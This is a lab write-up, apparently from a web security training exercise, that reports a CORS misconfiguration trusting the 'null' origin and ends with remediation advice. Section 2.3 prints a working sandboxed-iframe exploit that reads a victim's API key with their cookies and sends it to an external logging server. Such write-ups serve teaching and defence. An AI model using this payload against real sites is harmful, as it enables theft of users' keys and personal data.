# Lab: Sensitive Data Leakage via CORS Trusting "Null" Origin

**Severity:** High

**Vulnerability Type:** Cross-Origin Resource Sharing (CORS) Misconfiguration

**Target:** Web Security Academy Shop - User Account API 

##### 1. Executive Summary 

A security assessment of the "We Like to Shop" API revealed a CORS Misconfiguration
that exposes sensitive user data. 

The application's CORS policy explicitly trusts the `"null"` origin. While 
this is often done to support local development or specific client-side 
applications, it introduces a significant security flaw. An attacker can 
leverage an HTML `<iframe>` with the `sandbox` attribute to force a victim's
browser to generate a request with the origin `"null"`. Because the server 
trusts this origin and allows credentials, the attacker can successfully make
authenticated cross-domain requests and steal sensitive information (API Keys).

##### 2. Technical Walkthrough 

2.1 Vulnerability Analysis

The assessment began by inspecting the `/accountDetails` endpoint. To test the 
server's whitelist validation, a request was sent with the header `Origin: null`.

The server responded with:

- `Access-Control-Allow-Origin: null`

- `Access-Control-Allow-Credentials: true`

This confirms that the server logic explicitly permits requests from the 
"null" origin. 

<img width="1440" height="876" alt="bb2" src="https://github.com/user-attachments/assets/3593e94b-bc77-4b9e-92d5-27adf5ea089d" />

2.2 Exploitation Strategy (The Sandbox Trick)

A standard malicious site tends the origin `http://attacker.com`. If the server
blocked that but allowed `null`, we needed a way to disguise our origin.

The Sandboxed Iframe technique was employed. By placing an exploit script
inside an `<iframe>` with the `sandbox` attribute, the browser is forced
to treat the content as having a unique, opaque origin, which is serialised
as `"null"` in the HTTP headers. 

2.3 Payload Construction 

The following exploit was crafted. It creates a sandboxed iframe containing
JavaScript that requests the API key and exfiltrates it to the attacker's
server. 

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        var json = JSON.parse(this.responseText);
        // Exfiltrate the key
        location = 'https://exploit-server.net/log?key=' + json.apikey;
    };
    req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true; // Essential for sending cookies
    req.send();
</script>"></iframe>
```

<img width="1440" height="761" alt="bb3" src="https://github.com/user-attachments/assets/e487b0a1-c160-4fbb-8d84-947f183c31ae" />

2.4 Execution 

When the victim visited the exploit page, the invisible sandboxed iframe
executed the XHR request. The browser sent the request with `Origin: null`
(matching the server's whitelist) and the victim's session cookies. The API
returned the key, which was immediately sent to the attacker's log. 

<img width="1201" height="744" alt="bb4" src="https://github.com/user-attachments/assets/44be2adf-c33d-479a-b81d-b3ced374f0e3" />
<img width="1185" height="745" alt="bb5" src="https://github.com/user-attachments/assets/174b61b1-9fc5-43bc-85f3-93e9856fd303" />

##### 3. Impact Analysis

The impact is rated as High. 

- Bypassing Origin Whitelists: This demonstrates that whitelisting is
ineffective if the whitelist contains insecure entries like `null`.

- Data Exfiltration: Attackers can read any data available to the
authenticated user on that endpoint, including PII and API keys.

##### 4. Remediation 

To mitigate this vulnerability:

1. Remove "null" from Whitelist: The string `"null"` should almost never be
in a production CORS whitelist.

2. Strict whitelisting: Only allow specific, trusted domain names (e.g.,
`https://partner.example.com`).

3. Review Sandbox Usage: Developers should be aware that sandboxed iframes
generate `null` origins and protect their APIs accordingly. 
